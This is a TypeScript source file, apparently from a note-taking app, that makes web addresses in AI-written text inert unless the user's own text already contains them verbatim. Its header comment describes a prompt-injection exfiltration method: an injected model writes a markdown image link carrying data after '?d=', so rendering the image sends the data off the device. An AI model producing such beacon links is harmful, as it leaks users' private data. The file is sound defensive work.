import { preWriteLint } from "@plainva/core";

/**
 * Network addresses in text the AI wrote, before it is stored (ADR 0019 §6,
 * threat T1 "rendering beacon").
 *
 * A model under prompt injection can write `![](https://host/?d=…)` into its
 * answer; rendering fetches the image, and whatever it put after `?d=` has
 * left the device without ever passing the send overview. So every address
 * the model BROUGHT is made inert (`https[://]host/…`), wherever it stands:
 * readable, and neither loaded nor clickable.
 *
 * An address the user's own text already carries stays what it is — a rewrite
 * keeps the links of the passage it rewrites. "Already carries" means the
 * whole address, character for character: allowing its HOST would let the
 * model hang data onto a host the note merely mentions, and the note is where
 * an injected instruction comes from in the first place.
 *
 * This runs for everything the session writes on the model's behalf: the
 * blocks of a suggestion round, a transcript, a reply in a comment thread.
 * Until 2026-10-06 the linter of the core had tests and no caller.
 */

// Private-use characters that mark a kept address while the linter runs. Built
// from their code points so the source carries no invisible characters.
const OPEN = String.fromCharCode(0xe000);
const CLOSE = String.fromCharCode(0xe001);

// An address as it stands in running text: the linter's two patterns (an
// absolute network URL, a "www." GFM would link) in one.
const ADDRESS = /(?:\b(?:https?|ftps?|wss?):\/\/|(?<=^|[\s*_~()[\]])www\.)[^\s<>"'`\]\\]+/gim;
/** Sentence punctuation and brackets that end up attached to an address in running text. */
const TRAILING = new Set([")", "]", ".", ",", ";", ":", "!", "?", "'", '"', "*", "_", "~", ">"]);
/** What a renderer ends an address at. */
const STOP = /[\s)>\]"'<]/;
const PUNCTUATION = /[.,;:!?]/;
const TOKEN = /[A-Za-z0-9+.-]/;

function withoutTrailing(address: string): string {
  let end = address.length;
  while (end > 0 && TRAILING.has(address[end - 1]!)) end -= 1;
  return address.slice(0, end);
}

/** The complete addresses the texts carry, as written, longest first. */
function addressesOf(known: readonly string[]): string[] {
  const found = new Set<string>();
  for (const source of known) {
    for (const match of source.matchAll(ADDRESS)) {
      const address = withoutTrailing(match[0]);
      if (address) found.add(address);
    }
  }
  // Longest first: an address that continues another one is matched as itself.
  return [...found].sort((a, b) => b.length - a.length);
}

/** The address ends here: nothing follows that a renderer would still read as part of it. */
function endsAt(text: string, index: number): boolean {
  if (index >= text.length) return true;
  const next = text[index]!;
  if (STOP.test(next)) return true;
  // One sentence mark, then the end: "… see https://host/page."
  return PUNCTUATION.test(next) && (index + 1 >= text.length || STOP.test(text[index + 1]!));
}

export function defuseNewAddresses(text: string, known: readonly string[]): { text: string; defused: number } {
  const addresses = text.includes(OPEN) || text.includes(CLOSE) ? [] : addressesOf(known);
  if (addresses.length === 0) {
    const strict = preWriteLint(text);
    return { text: strict.text, defused: strict.findings.length };
  }
  // The user's own addresses step aside while everything else is made inert.
  const firsts = new Set(addresses.map((address) => address[0]));
  const kept: string[] = [];
  let guarded = "";
  for (let i = 0; i < text.length; ) {
    const starts = firsts.has(text[i]) && (i === 0 || !TOKEN.test(text[i - 1]!));
    const hit = starts ? addresses.find((address) => text.startsWith(address, i) && endsAt(text, i + address.length)) : undefined;
    if (hit === undefined) {
      guarded += text[i];
      i += 1;
      continue;
    }
    guarded += OPEN + kept.length.toString(36) + CLOSE;
    kept.push(hit);
    i += hit.length;
  }
  const linted = preWriteLint(guarded);
  const [head, ...rest] = linted.text.split(OPEN);
  let out = head ?? "";
  for (const part of rest) {
    const end = part.indexOf(CLOSE);
    const address = end < 0 ? undefined : kept[Number.parseInt(part.slice(0, end), 36)];
    out += address === undefined ? part : address + part.slice(end + 1);
  }
  return { text: out, defused: linted.findings.length };
}
